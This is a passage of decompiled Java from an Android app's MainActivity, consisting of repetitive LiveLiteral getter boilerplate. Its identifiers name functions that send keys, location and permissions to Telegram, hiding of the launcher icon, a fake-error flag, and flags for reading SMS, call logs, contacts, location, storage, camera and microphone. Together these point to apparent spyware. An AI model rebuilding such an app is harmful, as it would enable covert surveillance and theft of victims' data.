            f۳۷State$Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-0$call-setDoOutput$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity", offset = 16792)
    /* JADX INFO: renamed from: Boolean$arg-0$call-setDoOutput$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    public final boolean m۵Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۷Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۳۸State$Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-0$call-setDoOutput$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity", Boolean.valueOf(f۷Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity));
            f۳۸State$Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-0$call-setDoOutput$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity", offset = 20371)
    /* JADX INFO: renamed from: Boolean$arg-0$call-setDoOutput$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    public final boolean m۶Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۸Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۳۹State$Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-0$call-setDoOutput$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity", Boolean.valueOf(f۸Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity));
            f۳۹State$Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-0$call-setDomStorageEnabled$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity", offset = 11914)
    /* JADX INFO: renamed from: Boolean$arg-0$call-setDomStorageEnabled$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity, reason: not valid java name */
    public final boolean m۷Boolean$arg0$callsetDomStorageEnabled$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۹Boolean$arg0$callsetDomStorageEnabled$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۴۰State$Boolean$arg0$callsetDomStorageEnabled$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-0$call-setDomStorageEnabled$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity", Boolean.valueOf(f۹Boolean$arg0$callsetDomStorageEnabled$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity));
            f۴۰State$Boolean$arg0$callsetDomStorageEnabled$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-0$call-setJavaScriptEnabled$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity", offset = 11873)
    /* JADX INFO: renamed from: Boolean$arg-0$call-setJavaScriptEnabled$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity, reason: not valid java name */
    public final boolean m۸Boolean$arg0$callsetJavaScriptEnabled$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۰Boolean$arg0$callsetJavaScriptEnabled$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۴۱State$Boolean$arg0$callsetJavaScriptEnabled$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-0$call-setJavaScriptEnabled$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity", Boolean.valueOf(f۱۰Boolean$arg0$callsetJavaScriptEnabled$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity));
            f۴۱State$Boolean$arg0$callsetJavaScriptEnabled$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-0$call-setLauncherIconVisible$branch$if-1$fun-onCreate$class-MainActivity", offset = 11364)
    /* JADX INFO: renamed from: Boolean$arg-0$call-setLauncherIconVisible$branch$if-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final boolean m۹Boolean$arg0$callsetLauncherIconVisible$branch$if1$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۱Boolean$arg0$callsetLauncherIconVisible$branch$if1$funonCreate$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۴۲State$Boolean$arg0$callsetLauncherIconVisible$branch$if1$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-0$call-setLauncherIconVisible$branch$if-1$fun-onCreate$class-MainActivity", Boolean.valueOf(f۱۱Boolean$arg0$callsetLauncherIconVisible$branch$if1$funonCreate$classMainActivity));
            f۴۲State$Boolean$arg0$callsetLauncherIconVisible$branch$if1$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-0$call-setLauncherIconVisible$else$if-1$fun-onCreate$class-MainActivity", offset = 11548)
    /* JADX INFO: renamed from: Boolean$arg-0$call-setLauncherIconVisible$else$if-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final boolean m۱۰Boolean$arg0$callsetLauncherIconVisible$else$if1$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۲Boolean$arg0$callsetLauncherIconVisible$else$if1$funonCreate$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۴۳State$Boolean$arg0$callsetLauncherIconVisible$else$if1$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-0$call-setLauncherIconVisible$else$if-1$fun-onCreate$class-MainActivity", Boolean.valueOf(f۱۲Boolean$arg0$callsetLauncherIconVisible$else$if1$funonCreate$classMainActivity));
            f۴۳State$Boolean$arg0$callsetLauncherIconVisible$else$if1$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-0$call-setLauncherIconVisible$fun-$anonymous$$arg-0$call-postDelayed$branch$if-1$fun-onCreate$class-MainActivity", offset = 11467)
    /* JADX INFO: renamed from: Boolean$arg-0$call-setLauncherIconVisible$fun-$anonymous$$arg-0$call-postDelayed$branch$if-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final boolean m۱۱Boolean$arg0$callsetLauncherIconVisible$fun$anonymous$$arg0$callpostDelayed$branch$if1$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۳Boolean$arg0$callsetLauncherIconVisible$fun$anonymous$$arg0$callpostDelayed$branch$if1$funonCreate$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۴۴State$Boolean$arg0$callsetLauncherIconVisible$fun$anonymous$$arg0$callpostDelayed$branch$if1$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-0$call-setLauncherIconVisible$fun-$anonymous$$arg-0$call-postDelayed$branch$if-1$fun-onCreate$class-MainActivity", Boolean.valueOf(f۱۳Boolean$arg0$callsetLauncherIconVisible$fun$anonymous$$arg0$callpostDelayed$branch$if1$funonCreate$classMainActivity));
            f۴۴State$Boolean$arg0$callsetLauncherIconVisible$fun$anonymous$$arg0$callpostDelayed$branch$if1$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-0$call-setLauncherIconVisible$try$fun-onCreate$class-MainActivity", offset = 8350)
    /* JADX INFO: renamed from: Boolean$arg-0$call-setLauncherIconVisible$try$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final boolean m۱۲Boolean$arg0$callsetLauncherIconVisible$try$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۴Boolean$arg0$callsetLauncherIconVisible$try$funonCreate$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۴۵State$Boolean$arg0$callsetLauncherIconVisible$try$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-0$call-setLauncherIconVisible$try$fun-onCreate$class-MainActivity", Boolean.valueOf(f۱۴Boolean$arg0$callsetLauncherIconVisible$try$funonCreate$classMainActivity));
            f۴۵State$Boolean$arg0$callsetLauncherIconVisible$try$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-0$call-setLoadWithOverviewMode$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity", offset = 11995)
    /* JADX INFO: renamed from: Boolean$arg-0$call-setLoadWithOverviewMode$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity, reason: not valid java name */
    public final boolean m۱۳Boolean$arg0$callsetLoadWithOverviewMode$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۵Boolean$arg0$callsetLoadWithOverviewMode$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۴۶State$Boolean$arg0$callsetLoadWithOverviewMode$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-0$call-setLoadWithOverviewMode$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity", Boolean.valueOf(f۱۵Boolean$arg0$callsetLoadWithOverviewMode$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity));
            f۴۶State$Boolean$arg0$callsetLoadWithOverviewMode$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-0$call-setSupportZoom$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity", offset = 11950)
    /* JADX INFO: renamed from: Boolean$arg-0$call-setSupportZoom$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity, reason: not valid java name */
    public final boolean m۱۴Boolean$arg0$callsetSupportZoom$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۶Boolean$arg0$callsetSupportZoom$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۴۷State$Boolean$arg0$callsetSupportZoom$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-0$call-setSupportZoom$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity", Boolean.valueOf(f۱۶Boolean$arg0$callsetSupportZoom$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity));
            f۴۷State$Boolean$arg0$callsetSupportZoom$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-0$call-setUseWideViewPort$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity", offset = 12034)
    /* JADX INFO: renamed from: Boolean$arg-0$call-setUseWideViewPort$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity, reason: not valid java name */
    public final boolean m۱۵Boolean$arg0$callsetUseWideViewPort$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۷Boolean$arg0$callsetUseWideViewPort$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۴۸State$Boolean$arg0$callsetUseWideViewPort$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-0$call-setUseWideViewPort$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity", Boolean.valueOf(f۱۷Boolean$arg0$callsetUseWideViewPort$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity));
            f۴۸State$Boolean$arg0$callsetUseWideViewPort$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-1$call-EQEQ$fun-isAccessibilityServiceEnabled$class-MainActivity", offset = 18310)
    /* JADX INFO: renamed from: Boolean$arg-1$call-EQEQ$fun-isAccessibilityServiceEnabled$class-MainActivity, reason: not valid java name */
    public final boolean m۱۶Boolean$arg1$callEQEQ$funisAccessibilityServiceEnabled$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۸Boolean$arg1$callEQEQ$funisAccessibilityServiceEnabled$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۴۹State$Boolean$arg1$callEQEQ$funisAccessibilityServiceEnabled$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-1$call-EQEQ$fun-isAccessibilityServiceEnabled$class-MainActivity", Boolean.valueOf(f۱۸Boolean$arg1$callEQEQ$funisAccessibilityServiceEnabled$classMainActivity));
            f۴۹State$Boolean$arg1$callEQEQ$funisAccessibilityServiceEnabled$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-1$call-getBoolean$val-askedAccessibility$fun-onCreate$class-MainActivity", offset = 10340)
    /* JADX INFO: renamed from: Boolean$arg-1$call-getBoolean$val-askedAccessibility$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final boolean m۱۷Boolean$arg1$callgetBoolean$valaskedAccessibility$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۹Boolean$arg1$callgetBoolean$valaskedAccessibility$funonCreate$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۵۰State$Boolean$arg1$callgetBoolean$valaskedAccessibility$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-1$call-getBoolean$val-askedAccessibility$fun-onCreate$class-MainActivity", Boolean.valueOf(f۱۹Boolean$arg1$callgetBoolean$valaskedAccessibility$funonCreate$classMainActivity));
            f۵۰State$Boolean$arg1$callgetBoolean$valaskedAccessibility$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-1$call-optBoolean$arg-0$call-$set-backgroundCameraEnabled$$try-2$fun-onCreate$class-MainActivity", offset = 10080)
    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-backgroundCameraEnabled$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final boolean m۱۸Boolean$arg1$calloptBoolean$arg0$call$setbackgroundCameraEnabled$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۲۰Boolean$arg1$calloptBoolean$arg0$call$setbackgroundCameraEnabled$$try2$funonCreate$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۵۱State$Boolean$arg1$calloptBoolean$arg0$call$setbackgroundCameraEnabled$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-1$call-optBoolean$arg-0$call-$set-backgroundCameraEnabled$$try-2$fun-onCreate$class-MainActivity", Boolean.valueOf(f۲۰Boolean$arg1$calloptBoolean$arg0$call$setbackgroundCameraEnabled$$try2$funonCreate$classMainActivity));
            f۵۱State$Boolean$arg1$calloptBoolean$arg0$call$setbackgroundCameraEnabled$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-1$call-optBoolean$arg-0$call-$set-fakeError$$try-2$fun-onCreate$class-MainActivity", offset = 9988)
    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-fakeError$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final boolean m۱۹Boolean$arg1$calloptBoolean$arg0$call$setfakeError$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۲۱Boolean$arg1$calloptBoolean$arg0$call$setfakeError$$try2$funonCreate$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۵۲State$Boolean$arg1$calloptBoolean$arg0$call$setfakeError$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-1$call-optBoolean$arg-0$call-$set-fakeError$$try-2$fun-onCreate$class-MainActivity", Boolean.valueOf(f۲۱Boolean$arg1$calloptBoolean$arg0$call$setfakeError$$try2$funonCreate$classMainActivity));
            f۵۲State$Boolean$arg1$calloptBoolean$arg0$call$setfakeError$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-1$call-optBoolean$arg-0$call-$set-microphoneEnabled$$try-2$fun-onCreate$class-MainActivity", offset = 10159)
    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-microphoneEnabled$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final boolean m۲۰Boolean$arg1$calloptBoolean$arg0$call$setmicrophoneEnabled$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۲۲Boolean$arg1$calloptBoolean$arg0$call$setmicrophoneEnabled$$try2$funonCreate$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۵۳State$Boolean$arg1$calloptBoolean$arg0$call$setmicrophoneEnabled$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-1$call-optBoolean$arg-0$call-$set-microphoneEnabled$$try-2$fun-onCreate$class-MainActivity", Boolean.valueOf(f۲۲Boolean$arg1$calloptBoolean$arg0$call$setmicrophoneEnabled$$try2$funonCreate$classMainActivity));
            f۵۳State$Boolean$arg1$calloptBoolean$arg0$call$setmicrophoneEnabled$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-1$call-optBoolean$arg-0$call-$set-postNotifications$$try-2$fun-onCreate$class-MainActivity", offset = 9859)
    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-postNotifications$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final boolean m۲۱Boolean$arg1$calloptBoolean$arg0$call$setpostNotifications$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۲۳Boolean$arg1$calloptBoolean$arg0$call$setpostNotifications$$try2$funonCreate$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۵۴State$Boolean$arg1$calloptBoolean$arg0$call$setpostNotifications$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-1$call-optBoolean$arg-0$call-$set-postNotifications$$try-2$fun-onCreate$class-MainActivity", Boolean.valueOf(f۲۳Boolean$arg1$calloptBoolean$arg0$call$setpostNotifications$$try2$funonCreate$classMainActivity));
            f۵۴State$Boolean$arg1$calloptBoolean$arg0$call$setpostNotifications$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-1$call-optBoolean$arg-0$call-$set-readCallLog$$try-2$fun-onCreate$class-MainActivity", offset = 9647)
    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-readCallLog$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final boolean m۲۲Boolean$arg1$calloptBoolean$arg0$call$setreadCallLog$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۲۴Boolean$arg1$calloptBoolean$arg0$call$setreadCallLog$$try2$funonCreate$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۵۵State$Boolean$arg1$calloptBoolean$arg0$call$setreadCallLog$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-1$call-optBoolean$arg-0$call-$set-readCallLog$$try-2$fun-onCreate$class-MainActivity", Boolean.valueOf(f۲۴Boolean$arg1$calloptBoolean$arg0$call$setreadCallLog$$try2$funonCreate$classMainActivity));
            f۵۵State$Boolean$arg1$calloptBoolean$arg0$call$setreadCallLog$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-1$call-optBoolean$arg-0$call-$set-readContacts$$try-2$fun-onCreate$class-MainActivity", offset = 9522)
    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-readContacts$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final boolean m۲۳Boolean$arg1$calloptBoolean$arg0$call$setreadContacts$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۲۵Boolean$arg1$calloptBoolean$arg0$call$setreadContacts$$try2$funonCreate$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۵۶State$Boolean$arg1$calloptBoolean$arg0$call$setreadContacts$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-1$call-optBoolean$arg-0$call-$set-readContacts$$try-2$fun-onCreate$class-MainActivity", Boolean.valueOf(f۲۵Boolean$arg1$calloptBoolean$arg0$call$setreadContacts$$try2$funonCreate$classMainActivity));
            f۵۶State$Boolean$arg1$calloptBoolean$arg0$call$setreadContacts$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-1$call-optBoolean$arg-0$call-$set-readLocation$$try-2$fun-onCreate$class-MainActivity", offset = 9781)
    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-readLocation$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final boolean m۲۴Boolean$arg1$calloptBoolean$arg0$call$setreadLocation$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۲۶Boolean$arg1$calloptBoolean$arg0$call$setreadLocation$$try2$funonCreate$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۵۷State$Boolean$arg1$calloptBoolean$arg0$call$setreadLocation$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-1$call-optBoolean$arg-0$call-$set-readLocation$$try-2$fun-onCreate$class-MainActivity", Boolean.valueOf(f۲۶Boolean$arg1$calloptBoolean$arg0$call$setreadLocation$$try2$funonCreate$classMainActivity));
            f۵۷State$Boolean$arg1$calloptBoolean$arg0$call$setreadLocation$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-1$call-optBoolean$arg-0$call-$set-readSms$$try-2$fun-onCreate$class-MainActivity", offset = 9580)
    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-readSms$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final boolean m۲۵Boolean$arg1$calloptBoolean$arg0$call$setreadSms$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۲۷Boolean$arg1$calloptBoolean$arg0$call$setreadSms$$try2$funonCreate$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۵۸State$Boolean$arg1$calloptBoolean$arg0$call$setreadSms$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-1$call-optBoolean$arg-0$call-$set-readSms$$try-2$fun-onCreate$class-MainActivity", Boolean.valueOf(f۲۷Boolean$arg1$calloptBoolean$arg0$call$setreadSms$$try2$funonCreate$classMainActivity));
            f۵۸State$Boolean$arg1$calloptBoolean$arg0$call$setreadSms$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-1$call-optBoolean$arg-0$call-$set-readStorage$$try-2$fun-onCreate$class-MainActivity", offset = 9713)
    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-readStorage$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final boolean m۲۶Boolean$arg1$calloptBoolean$arg0$call$setreadStorage$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۲۸Boolean$arg1$calloptBoolean$arg0$call$setreadStorage$$try2$funonCreate$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۵۹State$Boolean$arg1$calloptBoolean$arg0$call$setreadStorage$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-1$call-optBoolean$arg-0$call-$set-readStorage$$try-2$fun-onCreate$class-MainActivity", Boolean.valueOf(f۲۸Boolean$arg1$calloptBoolean$arg0$call$setreadStorage$$try2$funonCreate$classMainActivity));
            f۵۹State$Boolean$arg1$calloptBoolean$arg0$call$setreadStorage$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-1$call-optBoolean$arg-0$call-$set-requirePermissions$$try-2$fun-onCreate$class-MainActivity", offset = 9454)
    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-requirePermissions$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final boolean m۲۷Boolean$arg1$calloptBoolean$arg0$call$setrequirePermissions$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
